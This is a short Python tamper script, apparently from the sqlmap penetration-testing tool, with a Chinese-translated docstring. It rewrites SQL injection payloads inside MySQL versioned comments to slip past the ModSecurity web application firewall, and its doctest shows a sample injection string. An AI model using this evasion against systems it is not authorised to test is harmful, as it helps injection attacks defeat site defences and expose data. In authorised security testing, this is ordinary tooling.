#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import randomInt
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage('篡改脚本“%s”仅适用于 %s' % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    "\n    使用 (MySQL) 版本化注释包含完整查询\n\n    Requirement:\n        * MySQL\n\n    测试针对：\n        * MySQL 5.0\n\n    Notes:\n        * 可用于绕过 ModSecurity WAF\n\n    >>> import random\n    >>> random.seed(0)\n    >>> tamper('1 AND 2>1--')\n    '1 /*!30963AND 2>1*/--'\n    "

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*!30%s%s*/%s" % (payload[:payload.find(' ')], randomInt(3), payload[payload.find(' ') + 1:], postfix)

    return retVal
